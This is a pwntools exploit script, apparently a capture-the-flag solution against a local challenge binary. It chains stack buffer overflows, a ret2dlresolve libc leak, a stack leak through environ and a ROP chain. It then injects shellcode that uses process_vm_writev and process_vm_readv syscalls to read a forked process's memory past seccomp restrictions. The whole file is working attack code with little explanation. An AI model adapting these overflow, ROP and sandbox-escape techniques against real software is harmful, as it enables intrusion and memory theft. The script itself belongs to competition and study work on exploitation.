from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['konsole', '-e']

p = process()
# gdb.attach(elf.path, """
# set follow-fork-mode parent
# """)

dlresolve = Ret2dlresolvePayload(elf, symbol="puts", args=[""], resolution_addr = elf.got['seccomp_release'], data_addr = 0x404600)

print(hex(dlresolve.data_addr))

payload = b''.ljust(272, b'a') + pack(dlresolve.data_addr+0x110) + pack(0x000000000040149c)

p.sendline(payload)

# payload = dlresolve.payload.ljust(272, b'a') + pack(0x3ff000 - 0x200) + pack(elf.get_section_by_name('.plt').header.sh_addr) + pack(dlresolve.reloc_index) + pack(0xdeadbeef)
payload = dlresolve.payload.ljust(272, b'a') + pack(dlresolve.data_addr+0x800) + pack(0x000000000040149c)

p.sendline(payload)

payload = b'a' * 272 + pack(0x404220 + 0x20) + pack(elf.get_section_by_name('.plt').header.sh_addr) + pack(dlresolve.reloc_index) + pack(0x00000000004013ce)

p.sendline(payload)

mmap_addr = int(p.recvline().split()[3], 16)
pid = int(p.recvline().split()[1])
context.log_level = 'debug'
p.recvline()
libc.address = u64(p.recvline().strip().ljust(8,b'\x00'))-2511632

payload = b'a' * 0x150 + pack(libc.symbols['environ'] + 0x20) + pack(0x00000000004013ce)
p.send(payload)

stack = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(stack))

payload = b'a' * (0x150-1) + pack(stack+0x110) + pack(0x000000000040149c)
p.send(payload)

pop_rdi = libc.address + 0x000000000002a145
syscall = libc.address + 0x000000000008fef2
pop_rax = libc.address + 0x0000000000043c23
pop_rdx_rbx = libc.address + 0x000000000008f0c5
pop_rsi = libc.address + 0x000000000002baa9
add_rax_rsi = libc.address + 0x00000000000baf25

payload = cyclic(271) + pack(stack+0x210) + pack(0x000000000040149c)
p.sendline(payload)

payload = flat(
    0x404500 + 0x110,
    b'a' * 16,
    pop_rdi, 0x404000,
    pop_rax, 9, pop_rsi, 1,
    add_rax_rsi, 
    pop_rsi, 0x1000,
    pop_rdx_rbx, 7, 0,
    syscall, 0x000000000040149c
)
p.sendline(payload)

shellcode = asm(f"""
sub rsp, 0x200

mov byte ptr [rsp], 0x00
    
mov rax, rsp
mov [rsp+0x40], rax
mov qword ptr [rsp+0x48], 1
    
mov rax, {mmap_addr}
mov [rsp+0x50], rax
mov qword ptr [rsp+0x58], 1

mov rax, 311
mov rdi, {pid}          
lea rsi, [rsp+0x40]    
mov rdx, 1              
lea r10, [rsp+0x50]     
mov r8, 1               
mov r9, 0               
syscall

mov qword ptr [rsp+0x60], 1
mov qword ptr [rsp+0x68], 0
    
mov rax, 35
lea rdi, [rsp+0x60]
xor rsi, rsi
syscall

mov qword ptr [rsp+0x48], 0x30
mov qword ptr [rsp+0x58], 0x30
    
mov rax, 310
mov rdi, {pid}
lea rsi, [rsp+0x40]
mov rdx, 1
lea r10, [rsp+0x50]
mov r8, 1
mov r9, 0
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 0x30
syscall
""").ljust(280, b'a') + pack(0x404500)
pause()
p.sendline(shellcode)

p.interactive()